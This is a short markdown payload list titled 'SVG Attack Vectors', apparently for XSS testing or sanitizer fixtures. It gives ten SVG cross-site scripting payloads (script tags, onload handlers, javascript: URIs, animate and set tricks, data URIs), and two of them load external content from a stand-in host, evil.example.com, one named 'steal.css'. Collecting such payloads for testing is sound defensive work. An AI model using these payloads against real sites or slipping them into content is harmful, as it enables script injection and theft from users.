# SVG Attack Vectors

## Inline SVG with script

<svg><script>alert('svg-xss')</script></svg>

## SVG with onload event

<svg onload="alert('xss')">

## SVG with external reference

<svg><use href="https://evil.example.com/xss.svg#x"/></svg>

## SVG with xlink

<svg><a xlink:href="javascript:alert(1)"><text>x</text></a></svg>

## SVG with data URI

<svg><image href="data:image/svg+xml,<svg onload=alert(1)>"/></svg>

## SVG with foreignObject

<svg><foreignObject><body onload="alert(1)"/></foreignObject></svg>

## SVG with animate

<svg><animate attributeName="href" to="javascript:alert(1)"/></svg>

## SVG with set element

<svg><set attributeName="onload" to="alert(1)"/></svg>

## SVG with style

<svg><style>@import 'https://evil.example.com/steal.css'</style></svg>

## SVG embedded in img tag

<img src="data:image/svg+xml,<svg onload=alert(1)>">